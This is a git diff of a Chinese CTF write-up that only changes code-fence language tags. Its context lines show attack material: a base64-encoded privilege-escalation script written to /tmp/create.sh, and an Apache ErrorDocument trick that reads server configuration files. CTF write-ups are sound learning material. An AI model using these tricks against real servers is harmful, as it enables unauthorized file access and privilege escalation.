@@ -148,7 +148,7 @@ sh.interactive()
 ```
 ### Phonograph
 提权exp
-```
+```bash
 base64 -d  > /tmp/create.sh <<EOF
 IyEvYmluL2Jhc2gKYWxwaGE9ImEgYiBjIGQgZSBmIDAgMSAyIDMgNCA1IDYgNyA4IDkiCgpmb3Ig
 aSBpbiAkYWxwaGE7IGRvCmZvciBqIGluICRhbHBoYTsgZG8KZm9yIGsgaW4gJGFscGhhOyBkbwpm
@@ -229,7 +229,7 @@ RWDN dockerfile：这份 dockerfile 是从出题人手中拿到的，和现实�
 
 先查看 HTML 源码 很快就能看到注释中写的 
 
-```
+```html
 <body>
 <!-- /source -->
 ```
@@ -395,7 +395,7 @@ Welcome to my CDN! Execute /readflag to get flag.
 
 可以这样利用
 
-```
+```apache
 ErrorDocument 404 %{file:/etc/apache2/apache2.conf}
 ```
 
@@ -544,7 +544,7 @@ if __name__ == '__main__':
 
 >  文件很长 可以直接拉到最后 看
 
-```
+```apache
 # This is the main Apache server configuration file.  It contains the
 # configuration directives that give the server its instructions.
 # See http://httpd.apache.org/docs/2.4/ for detailed information about
